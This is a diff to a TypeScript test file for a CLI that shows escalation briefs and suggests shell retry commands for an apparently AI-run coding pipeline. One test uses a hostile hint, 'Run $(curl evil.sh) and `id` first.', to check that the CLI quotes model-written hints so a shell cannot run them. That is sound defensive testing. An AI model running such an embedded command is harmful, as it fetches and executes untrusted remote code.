@@ -4,7 +4,12 @@
  * 2 mistyped).
  */
 import { afterEach, describe, expect, it } from "vitest";
-import { HttpServerApi, type RunDetail, type RunSummary } from "./api.js";
+import {
+  HttpServerApi,
+  type IssueSummary,
+  type RunDetail,
+  type RunSummary,
+} from "./api.js";
 import { runCli } from "./cli.js";
 import { PLAIN } from "./format.js";
 import { mockServer, type Route } from "./testing/mockServer.js";
@@ -132,6 +137,7 @@ const ESCALATED: RunDetail = {
         file: "server/app.test.ts",
         endpoint: "GET /health",
         error: "expected { status: 'ok' } to match { database: 'up' }",
+        cause: null,
         suspectedOwner: "backendCoding",
         occurrences: 1,
       },
@@ -139,6 +145,7 @@ const ESCALATED: RunDetail = {
     workingMemory: [
       { role: "backendCoding", note: "Aligned /health with the API Contract." },
     ],
+    brief: null,
     openDraftPrOnAbort: true,
   },
 };
@@ -760,6 +767,98 @@ describe("sdlccode escalation and abort", () => {
       /sdlccode escalation retry 27f388 "<hint>" --budget 3\.1M/,
     );
     expect(printed).toMatch(/The Token Budget is spent/);
+  });
+
+  it("shows the brief, and the retry with its hint ready to send (T24c)", async () => {
+    const { run, out } = await cli({
+      ...ESCALATED,
+      waiting: {
+        ...ESCALATED.waiting,
+        brief: {
+          facts: ["server/app.ts no longer exports createApp, route."],
+          analysis: {
+            failing: "Every backend test fails to load.",
+            tried: "The backend rewrote server/app.ts.",
+            cause: "server/app.ts dropped the template's createApp.",
+            choice: "retryWithHint",
+            hint: 'Restore "createApp" in server/app.ts.',
+          },
+          withoutAnalysis: null,
+        },
+        reports: [
+          {
+            ...(ESCALATED.waiting as { reports: IssueSummary[] }).reports[0]!,
+            cause: "--> prisma/schema.prisma:19",
+          },
+        ],
+      } as RunDetail["waiting"],
+    });
+
+    expect(await run("escalation", "show", "27f388")).toBe(0);
+
+    const printed = out.join("\n");
+    expect(printed).toMatch(/Failing +Every backend test fails to load\./);
+    expect(printed).toMatch(/Cause +server\/app\.ts dropped/);
+    expect(printed).toMatch(/Suggested +Retry with a hint/);
+    expect(printed).toMatch(/- server\/app\.ts no longer exports createApp/);
+    expect(printed).toMatch(/--> prisma\/schema\.prisma:19/);
+    // Single quotes: nothing in the hint is run by the shell it is pasted in.
+    expect(printed).toContain(
+      `sdlccode escalation retry 27f388 'Restore "createApp" in server/app.ts.' --budget 3.1M`,
+    );
+  });
+
+  // The hint came from a model that read the application's output.
+  it("never offers a hint the shell could run, and shows one it cannot quote", async () => {
+    const withHint = (hint: string) =>
+      cli({
+        ...ESCALATED,
+        waiting: {
+          ...ESCALATED.waiting,
+          brief: {
+            facts: [],
+            analysis: {
+              failing: "f",
+              tried: "t",
+              cause: "c",
+              choice: "retryWithHint",
+              hint,
+            },
+            withoutAnalysis: null,
+          },
+        } as RunDetail["waiting"],
+      });
+
+    const dollar = await withHint("Run $(curl evil.sh) and `id` first.");
+    await dollar.run("escalation", "show", "27f388");
+    expect(dollar.out.join("\n")).toContain(
+      "retry 27f388 'Run $(curl evil.sh) and `id` first.'",
+    );
+
+    const quote = await withHint("Don't touch server/app.ts.");
+    await quote.run("escalation", "show", "27f388");
+    const printed = quote.out.join("\n");
+    expect(printed).toContain("Suggested hint: Don't touch server/app.ts.");
+    expect(printed).toContain('retry 27f388 "<hint>"');
+  });
+
+  it("says why a brief has no analysis", async () => {
+    const { run, out } = await cli({
+      ...ESCALATED,
+      waiting: {
+        ...ESCALATED.waiting,
+        brief: {
+          facts: [],
+          analysis: null,
+          withoutAnalysis:
+            "Too little of the Token Budget is left for an analysis.",
+        },
+      } as RunDetail["waiting"],
+    });
+
+    expect(await run("escalation", "show", "27f388")).toBe(0);
+
+    expect(out.join("\n")).toMatch(/Too little of the Token Budget is left/);
   });
 
   it("retries with a hint and a higher budget", async () => {
